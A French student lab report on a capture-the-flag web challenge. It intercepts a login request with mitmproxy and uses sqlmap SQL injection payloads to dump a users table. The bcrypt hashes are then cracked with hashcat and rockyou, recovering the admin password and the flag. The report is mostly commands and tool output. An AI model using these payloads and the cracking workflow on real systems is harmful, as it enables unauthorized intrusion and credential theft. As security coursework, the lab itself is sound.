# Rapport TP Webapp KORP Terminal

By Clement ALLEGRE--COMMINGES and PETIT Lucien

## Sommaire

- [Introduction](#introduction)
- [1. Presentation de l'attaque](#1-presentation-de-lattaque)
- [2. Démarage des services](#2-démarage-des-services)
- [3. Déroulement de l'attaque](#3-déroulement-de-lattaque)
  - [3.1 Obtention des informations sur la communication entre le client et le terminal](#31-obtention-des-informations-sur-la-communication-entre-le-client-et-le-terminal)
  - [3.2 Recupération de la description des tables](#32-recupération-de-la-description-des-tables)
  - [3.3 Récuperation des tables](#33-récuperation-des-tables)
  - [3.4 Récuperation des mots de passe](#34-récuperation-des-mots-de-passe)
  - [3.5 Obtention du flag](#35-obtention-du-flag)
- [Conclusion](#conclusion)

## Introduction

Ce TP a pour but de mettre en oeuvre une attaque "Man in the midle" via un serveur proxy dans le but d'obtenir des identifiants de connexion. Il s'agit d'une attaque de type élevation de privilège. Nous commencerons par présenter l'attaque avant de présenter sont execution. Comme pour le précèdent TP (TimeKorp), nous avons souhaité pour dans une démarche d'approche en boîte noire dans l'objectif de mieux comprendre les mécancaniques de cette attaque ainsi que les problèmatiques liées.

## 1. Presentation de l'attaque

Notre cible est un Terminal Web sur lequel il faut s'indentifier depuis une interface client. Comme présenté ci-dessous:
![Alt text](./image/schema_infra.png)

Nous inseront un serveur proxy entre les deux pour nous permettre de capter les communications.
![Alt text](./image/schema_infra_mitm.png)

Une fois les communications obtenues, les données échangées serviront de base à une injection SQL à l'aide de l'outil sqlmap. Cette injection SQL nous permettra d'obtenir le contenur de la base de donné de ce site web et notament les noms des utilisateurs ainsi que les hashs des mot de passe associer.

Nous retrouverons ensuite les mot de passe en clair à l'aide de hashcat, un outil d'attaque par dictionnaire.

## 2. Démarage des services

Nous avons commencé par installer le serveur proxy sur notre Raspberry Pi ainsi que le serveur et le client cible.

Voici les commandes utilisées pour lancer chaque services:

- Pour lancer le service Terminal Korp:

    ```text
    user@motivation:~/Documents/polytech/web/[Very Easy] KORP Terminal $ sh build_docker.sh
    ```

- Pour lancer le mitm :

    ```text
    user@motivation:~ $ docker run --rm -it -v ~/.mitmproxy:/home/mitmproxy/.mitmproxy -p 8080:8080 mitmproxy/mitmproxy mitmdump --flow-detail 3 -w4 -w /home/mitmproxy/.mitmproxy/test.txt
    ```

- Lancement du client:

    ```text
    user@motivation:~/Documents/sqlmap-dev $ http_proxy=http://127.0.0.1:8080 lynx http://172.17.0.3:1337
    ```

![Alt text](./image/login.png)

## 3. Déroulement de l'attaque

### 3.1 Obtention des informations sur la communication entre le client et le terminal

Ensuite faire une tentative de connexion avec un user name et mot de passe aléatoire pour communiquer avec le serveur terminal Korp.

```text

user@motivation:~/.mitmproxy $ cat test.txt
POST http://172.17.0.3:1337/?username=user&password=password HTTP/1.0
Host: 172.17.0.3:1337
Accept: text/html, text/plain, text/sgml, text/css, */*;q=0.01
Accept-Encoding: gzip, compress, bzip2
Accept-Language: en
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Lynx/2.9.0dev.12 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/3.7.8
Referer: http://172.17.0.3:1337/
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

username=user&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}

```

### 3.2 Recupération de la description des tables

```text
user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt --ignore-code 401 -p username --tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.12.3#dev}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:39:35 /2025-12-09/

[16:39:35] [INFO] parsing HTTP request from '/home/user/.mitmproxy/test.txt'
[16:39:36] [INFO] resuming back-end DBMS 'mysql'
[16:39:36] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=user' RLIKE (SELECT (CASE WHEN (8098=8098) THEN 0x75736572 ELSE 0x28 END))-- uAoT&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=user' AND (SELECT 9045 FROM(SELECT COUNT(*),CONCAT(0x716b766b71,(SELECT (ELT(9045=9045,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- MGMf&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=user' AND (SELECT 4340 FROM (SELECT(SLEEP(5)))THqE)-- FTYa&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}
---
[16:39:36] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[16:39:36] [INFO] fetching database names
[16:39:36] [INFO] retrieved: 'information_schema'
[16:39:37] [INFO] retrieved: 'test'
[16:39:37] [INFO] retrieved: 'korp_terminal'
[16:39:37] [INFO] fetching tables for databases: 'information_schema, korp_terminal, test'
-------
*
* information non pertinante
*
-------
[16:40:01] [INFO] retrieved: 'korp_terminal'
[16:40:01] [INFO] retrieved: 'users'
Database: information_schema
[82 tables]

-------
*
* information non pertinante
*
-------

Database: korp_terminal
[1 table]
+---------------------------------------+
| users                                 |
+---------------------------------------+

[16:40:01] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times, 500 (Internal Server Error) - 171 times
[16:40:01] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/172.17.0.3'

[*] ending @ 16:40:01 /2025-12-09/
```

### 3.3 Récuperation des tables

```text
user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt -D korp_terminal -T users --columns --ignore-code 401
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.12.3#dev}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:46:18 /2025-12-09/

[16:46:18] [INFO] parsing HTTP request from '/home/user/.mitmproxy/test.txt'
[16:46:19] [INFO] resuming back-end DBMS 'mysql'
[16:46:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=user' RLIKE (SELECT (CASE WHEN (8098=8098) THEN 0x75736572 ELSE 0x28 END))-- uAoT&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=user' AND (SELECT 9045 FROM(SELECT COUNT(*),CONCAT(0x716b766b71,(SELECT (ELT(9045=9045,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- MGMf&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=user' AND (SELECT 4340 FROM (SELECT(SLEEP(5)))THqE)-- FTYa&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}
---
[16:46:19] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[16:46:19] [INFO] fetching columns for table 'users' in database 'korp_terminal'
[16:46:19] [INFO] retrieved: 'id'
[16:46:20] [INFO] retrieved: 'int(11)'
[16:46:20] [INFO] retrieved: 'username'
[16:46:20] [INFO] retrieved: 'varchar(255)'
[16:46:20] [INFO] retrieved: 'password'
[16:46:20] [INFO] retrieved: 'varchar(255)'
Database: korp_terminal
Table: users
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+

[16:46:20] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times, 500 (Internal Server Error) - 7 times
[16:46:20] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/172.17.0.3'

[*] ending @ 16:46:20 /2025-12-09/
```

```text
user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt -D korp_terminal -T users -C username,password --dump --igno
re-code 401
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.12.3#dev}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:50:03 /2025-12-09/

[16:50:03] [INFO] parsing HTTP request from '/home/user/.mitmproxy/test.txt'
[16:50:03] [INFO] resuming back-end DBMS 'mysql'
[16:50:03] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=user' RLIKE (SELECT (CASE WHEN (8098=8098) THEN 0x75736572 ELSE 0x28 END))-- uAoT&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}

-------
*
* information non pertinante
*
-------

[16:50:04] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[16:50:04] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'korp_terminal'
[16:50:04] [INFO] retrieved: '$2y$10$1vSdN5jTa5S0ybMs.FXUwemfLxeBYGgjGsTD...
[16:50:04] [INFO] retrieved: 'test'
[16:50:05] [INFO] retrieved: '$2y$10$bfni4oATx18uvyU9Aff8yuoXkjubqZyksIrj...
[16:50:05] [INFO] retrieved: 'user'
[16:50:05] [INFO] retrieved: '$2y$10$p34l3lUN9bZKhnT1.e891Ow.nrQnT7V73vt....
[16:50:05] [INFO] retrieved: 'admin'
Database: korp_terminal
Table: users
[3 entries]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| test     | $2y$10$1vSdN5jTa5S0ybMs.FXUwemfLxeBYGgjGsTDis.fuD6mx0lq9tLNe |
| user     | $2y$10$bfni4oATx18uvyU9Aff8yuoXkjubqZyksIrj9zkSOwAYTBmN4Zroi |
| admin    | $2y$10$p34l3lUN9bZKhnT1.e891Ow.nrQnT7V73vt.IuOvfZH1Jygxsxps6 |
+----------+--------------------------------------------------------------+

[16:50:05] [INFO] table 'korp_terminal.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/172.17.0.3/dump/korp_terminal/users.csv'
[16:50:05] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times, 500 (Internal Server Error) - 10 times
[16:50:05] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/172.17.0.3'

[*] ending @ 16:50:05 /2025-12-09/
```

```text
user@motivation:~/Documents $ cat users
test:$2y$10$1vSdN5jTa5S0ybMs.FXUwemfLxeBYGgjGsTDis.fuD6mx0lq9tLNe
user:$2y$10$bfni4oATx18uvyU9Aff8yuoXkjubqZyksIrj9zkSOwAYTBmN4Zroi
admin:$2y$10$p34l3lUN9bZKhnT1.e891Ow.nrQnT7V73vt.IuOvfZH1Jygxsxps6
```

### 3.4 Récuperation des mots de passe

```text
user@DESKTOP-5QE5MM5:~$ sudo gzip -d rockyou.txt.gz


user@DESKTOP-5QE5MM5:~$ hashcat -m 3200 users rockyou.txt
hashcat (v6.2.6) starting

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed(): Not Supported

CUDA API (CUDA 13.0)
====================
* Device #1: NVIDIA GeForce RTX 2060, 5105/6143 MB, 30MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-Intel(R) Core(TM) i5-9300H CPU @ 2.40GHz, 2874/5812 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashfile 'users' on line 1 (test:$...emfLxeBYGgjGsTDis.fuD6mx0lq9tLNe): Token length exception
Hashfile 'users' on line 2 (user:$...uoXkjubqZyksIrj9zkSOwAYTBmN4Zroi): Token length exception
Hashfile 'users' on line 3 (admin:...Ow.nrQnT7V73vt.IuOvfZH1Jygxsxps6): Token length exception

* Token length exception: 3/3 hashes
  This error happens if the wrong hash type is specified, if the hashes are
  malformed, or if input is otherwise not as expected (for example, if the
  --username option is used but no username is present)

No hashes loaded.

Started: Tue Dec  9 18:04:18 2025
Stopped: Tue Dec  9 18:04:20 2025
user@DESKTOP-5QE5MM5:~$ hashcat -m 3200 users rockyou.txt --user
hashcat (v6.2.6) starting

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed(): Not Supported

CUDA API (CUDA 13.0)
====================
* Device #1: NVIDIA GeForce RTX 2060, 5105/6143 MB, 30MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-Intel(R) Core(TM) i5-9300H CPU @ 2.40GHz, 2874/5812 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 3 digests; 3 unique digests, 3 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 131 MB

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2y$10$1vSdN5jTa5S0ybMs.FXUwemfLxeBYGgjGsTDis.fuD6mx0lq9tLNe:cutest
$2y$10$bfni4oATx18uvyU9Aff8yuoXkjubqZyksIrj9zkSOwAYTBmN4Zroi:username
$2y$10$p34l3lUN9bZKhnT1.e891Ow.nrQnT7V73vt.IuOvfZH1Jygxsxps6:myprecious

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: users
Time.Started.....: Tue Dec  9 18:06:01 2025 (1 min, 57 secs)
Time.Estimated...: Tue Dec  9 18:07:58 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      808 H/s (8.73ms) @ Accel:1 Loops:16 Thr:16 Vec:1
Speed.#2.........:       77 H/s (12.07ms) @ Accel:8 Loops:16 Thr:1 Vec:1
Speed.#*.........:      886 H/s
Recovered........: 3/3 (100.00%) Digests (total), 3/3 (100.00%) Digests (new), 3/3 (100.00%) Salts
Progress.........: 204064/43033152 (0.47%)
Rejected.........: 0/204064 (0.00%)
Restore.Point....: 67200/14344384 (0.47%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:1008-1024
Restore.Sub.#2...: Salt:1 Amplifier:0-1 Iteration:544-560
Candidate.Engine.: Device Generator
Candidates.#1....: s12345678 -> loreley
Candidates.#2....: lopez123 -> koichi
Hardware.Mon.#1..: Temp: 84c Util: 97% Core:1845MHz Mem:5500MHz Bus:16
Hardware.Mon.#2..: Util: 78%

Started: Tue Dec  9 18:05:08 2025
Stopped: Tue Dec  9 18:08:00 2025

```

### 3.5 Obtention du flag

Tentaive de connexion avec user : `admin` et password : `myprecious` depuis le client

Clearance to : Poly{t3rm1n4l_p4ssH4c4t_cr4ck1ng}
![Alt text](./image/flag.png)

## Conclusion
